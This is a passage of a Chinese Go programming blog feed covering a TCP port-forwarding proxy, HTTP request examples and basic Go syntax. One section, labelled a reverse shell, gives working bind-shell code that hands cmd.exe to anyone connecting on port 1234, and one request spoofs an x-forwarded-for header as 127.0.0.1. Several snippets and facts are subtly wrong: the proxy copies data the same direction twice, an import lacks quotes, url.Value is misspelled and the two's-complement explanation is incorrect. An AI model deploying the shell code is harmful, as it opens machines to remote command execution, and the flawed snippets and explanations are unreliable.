class="hljs-string">&quot;net&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//本地端口80监听</span><br>listener, err := net.Listen(<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;:80&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(<span class="hljs-string">&quot;unable to bind port&quot;</span>)<br>&#125;<br><span class="hljs-keyword">for</span> &#123;<br>conn, err := listener.Accept()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(<span class="hljs-string">&quot;unable to accept connection&quot;</span>)<br>&#125;<br><span class="hljs-keyword">go</span> handle(conn)<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handle</span><span class="hljs-params">(src net.Conn)</span></span> &#123;<br>dst, err := net.Dial(<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;joescatcam.website:80&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(<span class="hljs-string">&quot;unable to connect our unreachable host&quot;</span>)<br>&#125;<br><span class="hljs-keyword">defer</span> dst.Close()<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//将源的输出复制到目标</span><br><span class="hljs-keyword">if</span> _, err := io.Copy(src, dst); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(err)<br>&#125;<br>&#125;()<br><span class="hljs-comment">//将输出的目标复制回源</span><br><span class="hljs-keyword">if</span> _, err := io.Copy(src, dst); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="反向shell-不是反弹shell"><a href="#反向shell-不是反弹shell" class="headerlink" title="反向shell(不是反弹shell)"></a>反向shell(不是反弹shell)</h3><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230812152714.png"></p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230812152728.png"><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230812153127.png"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;net&quot;</span><br><span class="hljs-string">&quot;os/exec&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handle</span><span class="hljs-params">(c net.Conn)</span></span> &#123;<br><span class="hljs-comment">//exec.Command()有两个参数和一个返回值,返回值是cmd结构体指针,第一个参数是要打开的终端的路径,这里是本机开放端口允许外部连接,所以是cmd.exe,</span><br><span class="hljs-comment">//如果本机是linux,那就是&quot;/bin/sh&quot;,&quot;-i&quot;,-i是以交互模式运行终端,所以第二个参数就是可执行的参数,比如-h,--version</span><br>cmd := exec.Command(<span class="hljs-string">&quot;cmd.exe&quot;</span>)<br><span class="hljs-comment">//func Pipe() (*PipeReader, *PipeWriter)</span><br>rp, wp := io.Pipe()<br><span class="hljs-comment">//以下两个cmd操作不是在赋值,而是进行一个重定向操作</span><br>cmd.Stdin = c<br>cmd.Stdout = wp<br><span class="hljs-keyword">go</span> io.Copy(c, rp)<br>cmd.Run()<br>c.Close()<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>listener, err := net.Listen(<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;:1234&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(err)<br>&#125;<br>conn, err := listener.Accept()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(err)<br>&#125;<br><span class="hljs-keyword">go</span> handle(conn)<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="http请求"><a href="#http请求" class="headerlink" title="http请求"></a>http请求</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span>(<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span>      <span class="hljs-comment">//读取操作的包</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;log&quot;</span>     <span class="hljs-comment">//如有err直接退出</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    resp,err:=http.Get(<span class="hljs-string">&quot;https://blog.yblue.top&quot;</span>)  <span class="hljs-comment">//http.Get(&quot;&quot;)中存入url,返回值是*http.Response的结构体指针,resp下有很多种属性,比如状态(Status),会返回状态码和状态(200 OK),StatusCode会只返回状态码,Body是http报文中的响应主体</span><br>    <span class="hljs-comment">//这里也可以直接进行get请求,就在url里ga</span><br><span class="hljs-keyword">if</span> err!=<span class="hljs-literal">nil</span>&#123;<br>log.Fatalln(err)<br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br>body,err:=io.ReadAll(resp.Body)     <span class="hljs-comment">//这里反回的body是[]byte,是一个字节类型的切片</span><br><span class="hljs-keyword">if</span> err!=<span class="hljs-literal">nil</span>&#123;<br>log.Fatalln(err)<br>&#125;<br>fmt.Println(<span class="hljs-type">string</span>(body))<br>fmt.Println(resp.Status)<br><span class="hljs-keyword">if</span> resp.StatusCode ==<span class="hljs-number">200</span>&#123;<br>fmt.Println(<span class="hljs-string">&quot;OK&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果将请求放到内容里而不是直接在url路径里</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span>(<br><span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;log&quot;</span><br>    <span class="hljs-string">&quot;net/http&quot;</span><br>    <span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/url&quot;</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    url_object:=url.Value&#123;&#125;            <span class="hljs-comment">//创建了一个空的 url.Values 对象，可以用于存储 URL 的查询参数,这里是引用,url.Values&#123;&#125;是个指针</span><br>    Url,err:=url.Parse(<span class="hljs-string">&quot;https://baidu.com&quot;</span>)<br><span class="hljs-comment">//func url.Parse(rawURL string) (*url.URL, error)  将baidu.com转化成一个url.URL类型的指针并返回,对这个对象可以直接进行获取信息,此时url_object对应的就是https://baidu.com</span><br>    <span class="hljs-keyword">if</span> err!=<span class="hljs-literal">nil</span>&#123;<br>        log.Fatalln(err)<br>&#125;<br>    url_object.Set(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;xiaoming&quot;</span>)     <span class="hljs-comment">//set是覆盖,add是添加</span><br>    url_object.Set(<span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-string">&quot;12&quot;</span>)<br>    url_object.Set(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;taosu&quot;</span>)<br>    url_object.Add(<span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-string">&quot;13&quot;</span>)<br>    Url.RawQuery=url_object.Encode()      <span class="hljs-comment">//这个函数是一个类似整合的函数,前面set或者add的键值对,在使用过这个函数后,会被编码进url中并用&amp;连接起来,形成查询参数字符串</span><br>    urlPath:=Url.String()       <span class="hljs-comment">//Url现在是指针,  .String()是将url以字符串的形式输出出来</span><br>    fmt.Println(<span class="hljs-string">&quot;请求的路径是:&quot;</span>,urlPath)<br>    resp,err:=http.Get(urlPath)   <span class="hljs-comment">//对url发起请求</span><br>    <span class="hljs-keyword">defer</span> resp.Body.Close()<br>    <span class="hljs-keyword">if</span> err!=<span class="hljs-literal">nil</span>&#123;<br>        log.Fatalln(err)<br>    &#125;<br>    body,err:=io.ReadAll(resp.Body)<br>    <span class="hljs-keyword">if</span> err!=<span class="hljs-literal">nil</span>&#123;<br>        log.Fatalln(err)<br>&#125;<br>    fmt.Println(<span class="hljs-type">string</span>(body))    <span class="hljs-comment">//这里必须用string()函数,否则会直接打印ascii码而不是字符串</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs go">url.Values&#123;&#125; 是 Go 语言中 net/url 包提供的一个类型，用于表示 URL 查询参数的集合。<br><br>url.Values 是一个类似于字典的结构，它可以存储一系列的键值对，其中键和值都是字符串类型。它提供了一组方法来设置、获取和操作查询参数。<br><br>以下是一些常用的 url.Values 方法：<br><br>Set(key, value)：设置指定键的查询参数值。如果该键已存在，则会用新的值覆盖旧的值。如果该键不存在，则会将键值对添加到查询参数中。<br>Add(key, value)：向查询参数中添加一个新的键值对，不管该键是否已存在。如果该键已存在，则会将新的值追加到已有值的末尾，用 &amp; 符号分隔。<br>Get(key)：获取指定键的查询参数值。如果该键不存在，则返回空字符串。<br>Del(key)：删除指定键的查询参数。<br>Encode()：将 url.Values 对象编码为查询参数字符串。<br><br><span class="hljs-comment">//实例</span><br><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;net/url&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>url_object := url.Values&#123;&#125;<br>Url, err := url.Parse(<span class="hljs-string">&quot;https://blog.yblue.top&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(err)<br>&#125;<br>url_object.Set(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;admin&quot;</span>)<br>Url.RawQuery = url_object.Encode()<br>UrlPath := Url.String()<br>resp, err := http.Get(UrlPath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(err)<br>&#125;<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br>Body, _ := io.ReadAll(resp.Body)<br>fmt.Println(Body)<br>fmt.Println(<span class="hljs-string">&quot;utl的路径是:&quot;</span>, UrlPath, <span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;查询语句是:&quot;</span>, Url.RawQuery)<br>&#125;<br></code></pre></td></tr></table></figure><p>http请求且写入请求头内容</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    client := http.Client&#123;&#125;  <span class="hljs-comment">//Client是http包中定义的一个结构体,结构体可以通过结构体名字&#123;&#125;来创建一个对象</span><br>req, _ := http.NewRequest(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://blog.yblue.top&quot;</span>, <span class="hljs-literal">nil</span>)   <span class="hljs-comment">//http.Get是创造请求并发送,而这里是先创建请求</span><br>req.Header.Add(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;Paul_Chan&quot;</span>)<br>req.Header.Add(<span class="hljs-string">&quot;age&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>)<br>resp, _ := client.Do(req)    <span class="hljs-comment">//这一步是发送请求</span><br>body, _ := io.ReadAll(resp.Body)<br>fmt.Println(<span class="hljs-type">string</span>(body))<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="打印http请求头"><a href="#打印http请求头" class="headerlink" title="打印http请求头"></a>打印http请求头</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;net/http/httputil&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>req, _ := http.NewRequest(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;http://blog.yblue.top&quot;</span>, <span class="hljs-literal">nil</span>)<br>req.Header.Add(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;Paul_Chan&quot;</span>)<br>req.Header.Add(<span class="hljs-string">&quot;age&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>)<br>req.Header.Add(<span class="hljs-string">&quot;x-forwarded-for&quot;</span>, <span class="hljs-string">&quot;127.0.0.1&quot;</span>)<br><span class="hljs-comment">// 打印所有的请求头</span><br>requestDump, _ := httputil.DumpRequestOut(req, <span class="hljs-literal">true</span>)<br>fmt.Println(<span class="hljs-type">string</span>(requestDump))<br><br><span class="hljs-comment">// 发起实际的请求</span><br>client := http.DefaultClient<br>_,_ = client.Do(req)<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>lang</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>go基础语法</title>
    <link href="/2023/08/20/go%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
    <url>/2023/08/20/go%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="go语法基础"><a href="#go语法基础" class="headerlink" title="go语法基础"></a>go语法基础</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>在需要编写go的目录(假设是go_code),在go_code下</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">go</span> <span class="hljs-variable">mod</span> <span class="hljs-variable">init</span> <span class="hljs-function"><span class="hljs-title">go_code</span>(目录名)</span><br></code></pre></td></tr></table></figure><p>会在go_code目录下生成一个go.mod的初始化文件,在go_code目录下再创建一个目录.在该目录里编写代码</p><h2 id="位与进制"><a href="#位与进制" class="headerlink" title="位与进制"></a>位与进制</h2><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">二进制    BIN <span class="hljs-number">0</span> , <span class="hljs-number">1</span>, <span class="hljs-number">10</span><br>八进制    OCT <span class="hljs-number">0,1,2,3</span>,<span class="hljs-number">4,5,6,7</span>,<span class="hljs-number">10</span>(一零,不是十)<br>十进制    DEC <br>十六进制  HEX  <span class="hljs-number">0,1,2,3</span>,<span class="hljs-number">4,5,6,7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-keyword">A</span>,B,C,D,E,F,<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">位:(内存地址的宽度)</span><br><span class="hljs-section">BYTE:  8位   一个字节</span><br><span class="hljs-section">WORD:  16位</span><br><span class="hljs-section">DWORD: 32位</span><br><span class="hljs-section">QWORD: 64位</span><br></code></pre></td></tr></table></figure><h2 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main              <span class="hljs-comment">//引入包</span><br><br><span class="hljs-keyword">import</span> fmt                <span class="hljs-comment">//引入fmt的库,在go中导入了什么库,就必须使用,否则报错</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    fmt.Println(<span class="hljs-string">&quot;hello world&quot;</span>)         <span class="hljs-comment">//不需要分号</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> fmt<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">var</span> num <span class="hljs-type">int</span> = <span class="hljs-number">5</span>            <span class="hljs-comment">//var跟php类似的意思,赋值号必须有空格</span><br>    fmt.Println(num)           <span class="hljs-comment">//创建了num的变量就必须使用,否则报错</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//初始化</span><br><span class="hljs-keyword">var</span> a <span class="hljs-type">int</span> = <span class="hljs-number">5</span><br><span class="hljs-comment">//默认值(0)</span><br><span class="hljs-keyword">var</span> b <span class="hljs-type">int</span><br><span class="hljs-comment">//自动化推导(auto)</span><br>c := <span class="hljs-number">10</span><br><span class="hljs-comment">//多变量定义</span><br><span class="hljs-keyword">var</span> d,e <span class="hljs-type">int</span><br>d = <span class="hljs-number">20</span><br>e = <span class="hljs-number">30</span><br><span class="hljs-comment">//多变量定义</span><br><span class="hljs-keyword">var</span>(<br>f <span class="hljs-type">int</span> = <span class="hljs-number">2</span><br>    g <span class="hljs-type">int</span> = <span class="hljs-number">3</span><br>)<br><br><span class="hljs-comment">//在定义过变量之后i,要改变值直接改就可以</span><br>a = <span class="hljs-number">6</span>   <span class="hljs-comment">//a原本是5</span><br></code></pre></td></tr></table></figure><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><table><thead><tr><th>基本类型</th><th>复合类型</th></tr></thead><tbody><tr><td>int</td><td>array</td></tr><tr><td>folat</td><td>slice</td></tr><tr><td>string</td><td>map</td></tr><tr><td>bool</td><td>struct</td></tr><tr><td></td><td>pointer</td></tr><tr><td></td><td>function</td></tr><tr><td></td><td>chan</td></tr></tbody></table><p>按照特性来分</p><table><thead><tr><th>值类型</th><th align="center">引用类型(传递地址,多变量指向同一内存地址)</th></tr></thead><tbody><tr><td>int</td><td align="center">slice</td></tr><tr><td>float</td><td align="center"></td></tr><tr><td>string</td><td align="center"></td></tr><tr><td>bool</td><td align="center"></td></tr><tr><td>struct</td><td align="center"></td></tr><tr><td></td><td align="center"></td></tr><tr><td></td><td align="center"></td></tr></tbody></table><h3 id="深浅拷贝"><a href="#深浅拷贝" class="headerlink" title="深浅拷贝"></a>深浅拷贝</h3><p>深拷贝是把数据都复制一份在传递,被传递的跟原有数据已经没关系了</p><p>浅拷贝是传址,一个改变另一个也改变</p><h2 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h2><table><thead><tr><th>有符号整型</th><th>无符号整型</th><th>字符(ASCII)</th><th>字符(unicode)</th></tr></thead><tbody><tr><td>int (默认64bit)</td><td>uint</td><td>byte</td><td>rune</td></tr><tr><td>int8 (8bit)</td><td>uint8</td><td></td><td></td></tr><tr><td>int16 (16bit)</td><td>uint16</td><td></td><td></td></tr><tr><td>int32 (32bit)</td><td>uint32</td><td></td><td></td></tr><tr><td>int64 (64bit)</td><td>uint64</td><td></td><td></td></tr></tbody></table><p>符号位是从左往右数第一位(有符号整型),0是正数,1是负数,所以int8是-128到127</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">如果求的数是负数,那么则要求该数对应的补码,即把所有数取反(<span class="hljs-number">0换1,1换0</span>)那么本来最大的<span class="hljs-number">127(0111</span> <span class="hljs-number">1111</span>)就变成了(<span class="hljs-number">1000 0000</span>)的-<span class="hljs-number">128</span><br></code></pre></td></tr></table></figure><p>int16是-32768到32767,uint16是0到65535</p><p>ASCII可以等于成uint8</p><p>在go中的unicode版本是UTF-32,4字节,32bit</p><h2 id="浮点"><a href="#浮点" class="headerlink" title="浮点"></a>浮点</h2><p>float32 4字节</p><p>float64 8字节</p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><h3 id="数值类型转换"><a href="#数值类型转换" class="headerlink" title="数值类型转换"></a>数值类型转换</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> numa <span class="hljs-type">int64</span> = <span class="hljs-number">12138</span><br><span class="hljs-keyword">var</span> numb <span class="hljs-type">int8</span> = <span class="hljs-type">int8</span>(numa)<br>fmt.Println(numb)          <span class="hljs-comment">//106</span><br></code></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> numa <span class="hljs-type">int64</span> = <span class="hljs-number">12138</span><br><span class="hljs-keyword">var</span> numb <span class="hljs-type">int8</span> = <span class="hljs-type">int8</span>(numa)<br><span class="hljs-keyword">var</span> numc <span class="hljs-type">int32</span> =<span class="hljs-type">int32</span>(numb)<br><span class="hljs-keyword">var</span> str <span class="hljs-type">string</span> = fmt.Sprintf(<span class="hljs-string">&quot;%d %d %d&quot;</span>,numa,numb,numc)<br><span class="hljs-comment">//fmt.Sprintf是吧其它类型的值转化成字符串的专用函数</span><br><span class="hljs-comment">//输出12138 106 106</span><br></code></pre></td></tr></table></figure><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-keyword">const</span> (<br>numA = <span class="hljs-number">11</span><br>numB = <span class="hljs-number">22</span><br>)<br><br><span class="hljs-keyword">const</span> (<br>a = <span class="hljs-number">1</span>                  <span class="hljs-comment">//在前一个常量定义后,如果后一个常量未被定义,则跟前一个常量相等</span><br>b<br>c = <span class="hljs-number">33</span><br>d<br>)<br><br><span class="hljs-keyword">const</span> (<br>numC = <span class="hljs-literal">iota</span>            <span class="hljs-comment">//自带的枚举量,会从0开始计数</span><br>numD<br>numE<br>numF<br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">const</span> pi = <span class="hljs-number">3.1415</span>      <span class="hljs-comment">//既可以定义在main函数内也可以在外部定义</span><br><span class="hljs-comment">//3.1415</span><br>fmt.Println(pi)<br><span class="hljs-comment">//11 22</span><br>fmt.Println(numA, numB)<br><span class="hljs-comment">//1 1 33 33</span><br>fmt.Println(a, b, c, d)<br><span class="hljs-comment">//0 1 2 3 </span><br>fmt.Println(numC, numD, numE, numF)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="关系与逻辑运算"><a href="#关系与逻辑运算" class="headerlink" title="关系与逻辑运算"></a>关系与逻辑运算</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">fmt.Println((<span class="hljs-number">1</span>&gt;<span class="hljs-number">2</span>))     <span class="hljs-comment">//输出false</span><br>&amp;&amp;  <span class="hljs-comment">//左右两侧均为真则结果为真</span><br>||  <span class="hljs-comment">//或</span><br>!   <span class="hljs-comment">//非</span><br></code></pre></td></tr></table></figure><h2 id="位运算"><a href="#位运算" 